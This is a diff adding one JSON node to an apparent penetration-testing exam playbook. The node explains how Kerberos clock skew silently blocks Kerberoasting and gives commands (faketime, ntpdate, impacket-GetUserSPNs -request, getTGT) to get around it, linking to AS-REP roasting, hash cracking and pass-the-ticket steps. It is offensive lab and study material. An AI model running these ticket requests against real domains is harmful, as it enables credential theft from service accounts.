@@ -1,0 +1,30 @@
+{
+  "id": "kerberos_clock_skew",
+  "phase": "AD",
+  "title": "Kerberos Clock Skew (KRB_AP_ERR_SKEW)",
+  "body": "Kerberos rejects any request whose timestamp is more than 5 minutes off the KDC's clock — this is anti-replay, not a misconfiguration you can talk your way past. Lab DCs are frequently years out of sync with your Kali host. The tell is KRB_AP_ERR_SKEW(Clock skew too great), and it bites GetUserSPNs -request, getTGT, GetNPUsers -request, and any -k -no-pass auth.\n\nThe trap: SPN enumeration runs over LDAP using your password, so it succeeds and prints a clean table of roastable accounts. Only the ticket request speaks Kerberos. You get a healthy-looking SPN list, no hashes, and no outputfile — easy to misread as 'no hashes available' when it is purely a clock problem. Always confirm the outputfile actually exists before moving on.",
+  "cmd": "# --- Check the drift first (changes nothing) -----------\nntpdate -q <DC_IP>\n\n# --- Option 1: per-process, no system clock change (preferred) ---\nfaketime \"$(ntpdate -q <DC_IP> | awk '{print $1\" \"$2}')\" \\\n  impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP> -request -outputfile tgs.txt\n\n# Works for any Kerberos tool — wrap the whole command:\nfaketime \"$(ntpdate -q <DC_IP> | awk '{print $1\" \"$2}')\" \\\n  impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>\n\n# --- Option 2: sync the host clock to the DC ------------\nsudo timedatectl set-ntp 0        # MUST be first — timesyncd re-syncs within seconds otherwise\nsudo ntpdate -u <DC_IP>\ntimedatectl status                # confirm it took\n\n# ... run your Kerberos tooling ...\n\nsudo timedatectl set-ntp 1        # restore when done\n\n# --- If ntpdate is not installed ------------------------\nsudo apt install ntpdate -y\n# or pull the time from the DC over SMB:\nnxc smb <DC_IP> | grep -i time\nsudo rdate -n <DC_IP>\n\n# --- Verify the fix worked ------------------------------\nls -l tgs.txt                     # no file = it still failed\ngrep -c 'krb5tgs' tgs.txt",
+  "warn": "Run 'sudo timedatectl set-ntp 0' BEFORE ntpdate — otherwise systemd-timesyncd drags the clock back to real time within seconds and you will think the fix did not work. Restore with 'set-ntp 1' when finished: a desynced clock breaks TLS certificate validation, so apt, pip, and web browsing start throwing confusing cert-expiry errors. faketime avoids this entirely and is the safer default on an exam clock.",
+  "choices": [
+    {
+      "label": "Clock fixed — request the Kerberoast hashes",
+      "next": "kerberoast"
+    },
+    {
+      "label": "Clock fixed — AS-REP roast instead",
+      "next": "asrep_roast"
+    },
+    {
+      "label": "Got the hashes — crack them",
+      "next": "hashcat_roast_cracking"
+    },
+    {
+      "label": "Still failing — I have a TGT/ccache issue instead",
+      "next": "pass_the_ticket"
+    },
+    {
+      "label": "Back to AD menu",
+      "next": "jump_ad"
+    }
+  ]
+}
